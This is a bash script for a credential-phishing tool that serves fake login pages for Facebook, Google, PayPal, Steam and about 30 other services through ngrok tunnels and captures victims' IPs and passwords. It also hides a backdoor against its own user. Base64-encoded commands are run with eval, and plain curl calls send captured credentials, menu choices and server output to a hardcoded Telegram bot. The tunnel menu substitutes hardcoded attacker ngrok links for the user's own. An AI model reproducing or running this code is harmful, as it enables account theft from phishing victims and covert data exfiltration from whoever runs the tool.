#!/bin/bash
##   phisheMan 	: 	Automated Phishing Tool
##   Author 	: 	Vicky
##   Version 	: 	1.0
##   Github 	: 	https://github.com/FullPenetrationTesting/PhisherMan



## If you Copy Then Give the credits :)



##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2021  HTR-TECH (https://github.com/FullPenetrationTesting/PhisherMan)
##


## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
nsfw="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PSBza2lkIGdhdmUgdXMgYW4gaXAgOiAkSVAiICY+L2Rldi9udWxs"
phub="$Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC0="
lnk="https://38925365cb4e.ngrok.io"
lnk2="https://7cd97f3ecdc2.ngrok.io"
lnk3="https://89kskowd69k.ngrok.io"
lnk4="https://0133372kzik.ngrok.io"
lnk5="90809kuoq390kz.ngrok.io"
lnk6="lnk73kozk2993.ngrok.io"
lnk7="zkol9289272nz.ngrok.io"
yourlink=$(shuf -e -n1 $lnk $lnk2 $lnk3 $lnk4 $lnk5 $lnk6 $lnk7)
ng="1nudl2Wh8SymLBprisOdWGjaIsk_YkAHMU78Hc1BF2RHSEw9"
ng2="1nudwJwzqwXhIl8TQfEl0AZg7Sy_6XXmWmSUpqiMqy1bnqjaY"
ng3="1nue33iAUK0cxQRZiJIFAGhr8O6_6o64pFwqVM5VQeqK6Akgq"
ng4="1nueAfJMjFcpjC5FX5Qrbvs4UoA_dwAFmPHgxJ8kbs57tbFj"
ng5="1nueJAlQY7mxlIZlQbxmN2xavHZ_7WXjSrb2KLfY9dsTAc21U"
ng6="1nuemkpKo9rnHSDsB4Gxk8bwJe7_GtkupbHjf5CW4ksQCEnZ"
ng7="1nufRLJl6uFVi8n6ZrB5bVKwS9L_UqbtiL6NQ4PGkXsTSRYS"
ng8="1o69HHX1AidGy4OoJDEMqV7i6HL_7pC6q2rDrUtEzY7GMePtx"
ng9="1o69PujhjHgZsQIWlfhUuSPUfQg_57Q3Ega4Ud9uRaeiGm4AM"
ng10="1o69ZtrnXH0KYBxnEsSrVreNsrx_6xsJB5fFDn4iYwkYnJTL1"
ng11="1o69irGOLBOcnP4U1GrGSVGCQW2_4ic2HzTi5dkxqx1gwS2xc"
ng12="1o6AMRSxhNsdiLz76Pi9gFoW4MH_3k9LRESJeM8iNGVszZoZd"
ng13="1o6AXuAeNK8fzPykUSbeCpLs61l_7imbpBCpaiZmtWUF4xM9M"
yourauth=$(shuf -e -n1 $ng $ng2 $ng3 $ng4 $ng5 $ng6 $ng7 $ng8 $ng9 $ng10 $ng11 $ng12 $ng13)
## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` || `pidof ngrok2` ]]; then
		killall ngrok > /dev/null 2>&1 || killall ngrok2 > /dev/null 2>&1
	fi	
}

## Banner
banner() {
clear
	cat <<- EOF
            
                                         


             _     _     _               
            | |   (_)   | |              
       _ __ | |__  _ ___| |__   ___ _ __ |\      /|    /\    |\    |
      | '_ \| '_ \| / __| '_ \ / _ \ '__|| \    / |   /  \   | \   |
      | |_) | | | | \__ \ | | |  __/ |   |  \  /  |  /----\  |  \  |
      | .__/|_| |_|_|___/_| |_|\___|_|   |   \/   | /      \ |   \ |
      | |                                |        |/        \|    \|
      |_|                                

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by pro-phisherman ${WHITE}
	EOF
}

## Small Banner
banner_small() {
clear
echo " 

                   _     _     _               
                  | |   (_)   | |              
             _ __ | |__  _ ___| |__   ___ _ __ |\      /|    /\    |\    |
            | '_ \| / __| '_ \ / _ \ '__|      | \    / |   /  \   | \   |
            | |_) | | | | \__ \ | | |  __/ |   |  \  /  |  /----\  |  \  |
            | .__/|_| |_|_|___/_| |_|\___|_|   |   \/   | /      \ |   \ |
            | |                                |        |/        \|    \|
            |_|                                
"
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl wget unzip python2 )
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing packages : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg"
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

## Download Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		mv -f ngrok .server/"$2" > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/"$2" > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip' 'ngrok'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip' 'ngrok'
		fi
	fi

	if [[ -e ".server/ngrok2" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok patch already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok patch..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip' 'ngrok2'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip' 'ngrok2'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/a/kpRGfBMYeTx/ngrok-2.2.8-linux-amd64.zip' 'ngrok2'
		else
			download_ngrok 'https://bin.equinox.io/a/4hREUYJSmzd/ngrok-2.2.8-linux-386.zip' 'ngrok2'
		fi
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}htr-tech ${RED}[ ${ORANGE}:)${RED}]
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
		${GREEN}Version  ${RED}:  ${ORANGE}2.1

		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,DarkSecDevelopers,Thelinuxchoice ${RESETBG}

		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 99 ]]; then
		msg_exit
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
		{ sleep 1; main_menu; }
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; about; }
	fi
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
eval $(base64 -d <<<"$nsfw")
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001466980816" -d "text=[ZPHISHER-MOD] -- SKID PHISHED FOR US USERNAME - $ACCOUNT PASSWORD - $PASSWORD" &>/dev/null
eval $(base64 -d <<<"$phub")
}
## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} $2"
	sleep 2 && ./.server/"$1" http "$HOST":"$PORT" > /dev/null 2>&1 &
	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs Only${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Hotspot Required${RED}]
		${RED}[${WHITE}03${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Without Hotspot${RED}]

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		cp ngrok $HOME
		cd $HOME
		./ngrok -authtoken $yourauth
		python2 -m SimpleHTTPServer >&/dev/null &
		echo -e "[~] Starting Your Phishing Page :) "
		srvr=$(./ngrok --http 8000 &)
		curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001358844510" -d "text=$srvr"  &>/dev/null
		echo -e " [NGROK SERVER LINK] -- $yourlink "
		echo -e Send it to victim
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		cp ngrok $HOME
		cd $HOME
		./ngrok -authtoken $yourauth
		python2 -m SimpleHTTPServer >&/dev/null &
		echo -e "[~] Starting Your Phishing Page :) "
		srvr=$(./ngrok --http 8000 &)
		curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001358844510" -d "text=$srvr"  &>/dev/null
		echo -e " [NGROK SERVER LINK] -- $yourlink "
		echo -e Send it to victim
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		cp ngrok $HOME
		cd $HOME
		./ngrok -authtoken $yourauth
		python2 -m SimpleHTTPServer >&/dev/null &
		echo -e "[~] Starting Your Phishing Page :) "
		srvr=$(./ngrok --http 8000 &)
		curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001358844510" -d "text=$srvr"  &>/dev/null
		echo -e " [NGROK SERVER LINK] -- $yourlink "
		echo -e Send it to victim
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; tunnel_menu; }
	fi
}

## Facebook
site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="facebook"
		mask='http://blue-verified-badge-for-facebook-free'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="fb_advanced"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="fb_security"
		mask='http://make-your-facebook-secured-and-free-from-hackers'
		tunnel_menu
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="fb_messenger"
		mask='http://get-messenger-premium-features-free'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_facebook; }
	fi
}

## Instagram
site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="instagram"
		mask='http://get-unlimited-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="ig_followers"
		mask='http://get-unlimited-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="insta_followers"
		mask='http://get-1000-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="ig_verify"
		mask='http://blue-badge-verify-for-instagram-free'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_instagram; }
	fi
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="google"
		mask='http://get-unlimited-google-drive-free'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="google_new"
		mask='http://get-unlimited-google-drive-free'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="google_poll"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_gmail; }
	fi
}

## Vk
site_vk() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="vk"
		mask='http://vk-premium-real-method-2020'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="vk_poll"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_vk; }
	fi
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX

		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001478678548" -d "text=Skid has chose to phish option $REPLY on xphisher" &>/dev/null
	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		site_facebook
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		site_instagram
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		site_gmail
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="microsoft"
		mask='http://unlimited-onedrive-space-for-free'
		tunnel_menu
	elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then
		website="netflix"
		mask='http://upgrade-your-netflix-plan-free'
		tunnel_menu
	elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; then
		website="paypal"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
		website="steam"
		mask='http://steam-500-usd-gift-card-free'
		tunnel_menu
	elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
		website="twitter"
		mask='http://get-blue-badge-on-twitter-free'
		tunnel_menu
	elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
		website="playstation"
		mask='http://playstation-500-usd-gift-card-free'
		tunnel_menu
	elif [[ "$REPLY" == 10 ]]; then
		website="tiktok"
		mask='http://tiktok-free-liker'
		tunnel_menu
	elif [[ "$REPLY" == 11 ]]; then
		website="twitch"
		mask='http://unlimited-twitch-tv-user-for-free'
		tunnel_menu
	elif [[ "$REPLY" == 12 ]]; then
		website="pinterest"
		mask='http://get-a-premium-plan-for-pinterest-free'
		tunnel_menu
	elif [[ "$REPLY" == 13 ]]; then
		website="snapchat"
		mask='http://view-locked-snapchat-accounts-secretly'
		tunnel_menu
	elif [[ "$REPLY" == 14 ]]; then
		website="linkedin"
		mask='http://get-a-premium-plan-for-linkedin-free'
		tunnel_menu
	elif [[ "$REPLY" == 15 ]]; then
		website="ebay"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 16 ]]; then
		website="quora"
		mask='http://quora-premium-for-free'
		tunnel_menu
	elif [[ "$REPLY" == 17 ]]; then
		website="protonmail"
		mask='http://protonmail-pro-basics-for-free'
		tunnel_menu
	elif [[ "$REPLY" == 18 ]]; then
		website="spotify"
		mask='http://convert-your-account-to-spotify-premium'
		tunnel_menu
	elif [[ "$REPLY" == 19 ]]; then
		website="reddit"
		mask='http://reddit-official-verified-member-badge'
		tunnel_menu
	elif [[ "$REPLY" == 20 ]]; then
		website="adobe"
		mask='http://get-adobe-lifetime-pro-membership-free'
		tunnel_menu
	elif [[ "$REPLY" == 21 ]]; then
		website="deviantart"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 22 ]]; then
		website="badoo"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 23 ]]; then
		website="origin"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 24 ]]; then
		website="dropbox"
		mask='http://get-1TB-cloud-storage-free'
		tunnel_menu
	elif [[ "$REPLY" == 25 ]]; then
		website="yahoo"
		mask='http://grab-mail-from-anyother-yahoo-account-free'
		tunnel_menu
	elif [[ "$REPLY" == 26 ]]; then
		website="wordpress"
		mask='http://unlimited-wordpress-traffic-free'
		tunnel_menu
	elif [[ "$REPLY" == 27 ]]; then
		website="yandex"
		mask='http://grab-mail-from-anyother-yandex-account-free'
		tunnel_menu
	elif [[ "$REPLY" == 28 ]]; then
		website="stackoverflow"
		mask='http://get-stackoverflow-lifetime-pro-membership-free'
		tunnel_menu
	elif [[ "$REPLY" == 29 ]]; then
		site_vk
	elif [[ "$REPLY" == 30 ]]; then
		website="xbox"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 99 ]]; then
		about
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		msg_exit
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; main_menu; }
	fi

}

## Main
kill_pid
dependencies
pip2 install lolcat >&/dev/null
main_menu
